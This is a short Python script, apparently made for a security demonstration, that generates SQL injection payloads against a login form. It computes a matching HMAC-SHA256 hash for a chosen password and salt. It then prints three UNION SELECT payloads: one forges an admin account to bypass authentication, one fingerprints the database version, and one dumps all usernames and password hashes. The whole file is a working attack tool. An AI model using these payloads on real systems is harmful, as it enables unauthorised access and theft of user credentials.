import hashlib
import hmac

def generate_attack_suite():
    """
    Generates ready-to-use SQL Injection payloads for the demonstration.
    This simulates an attacker creating valid cryptographic hashes to bypass authentication.
    """
    print("\n--- [HACKER TOOL] Advanced Exploit Generator ---")
    
    # 1. Define the password the attacker wants to type
    password = "password123"
    # 2. Define a fake salt
    fake_salt = "1111"
    
    # 3. Compute the valid HMAC-SHA256 hash for this password/salt combo
    # This allows us to satisfy the server's password check logic.
    h = hmac.new(
        key=fake_salt.encode('utf-8'), 
        msg=password.encode('utf-8'), 
        digestmod=hashlib.sha256
    )
    fake_hash = h.hexdigest()
    
    print(f"Password to use during login: {password}")
    print("-" * 60)

    # --- Payload 1: Admin Imposter ---
    # We inject 'admin' into the username column.
    payload_admin = f"' UNION SELECT 999, 'admin', 'hacked@site.com', '{fake_hash}', '{fake_salt}', 0 #"
    
    # --- Payload 2: Fingerprinting (Get Version) ---
    # We inject @@version into the username column.
    payload_version = f"' UNION SELECT 999, @@version, 'hacked@site.com', '{fake_hash}', '{fake_salt}', 0 #"
    
    # --- Payload 3: Data Dump (Get All Users) ---
    # We inject the result of GROUP_CONCAT into the username column.
    payload_dump = f"' UNION SELECT 999, GROUP_CONCAT(username, ':', password_hash), 'hacked@site.com', '{fake_hash}', '{fake_salt}', 0 FROM users #"

    print("\n[1] ADMIN LOGIN PAYLOAD (Impersonation):")
    print(payload_admin)
    
    print("\n[2] GET VERSION PAYLOAD (Fingerprinting):")
    print(payload_version)
    
    print("\n[3] DUMP ALL USERS PAYLOAD (Data Exfiltration):")
    print(payload_dump)
    print("-" * 60)

if __name__ == "__main__":
    generate_attack_suite()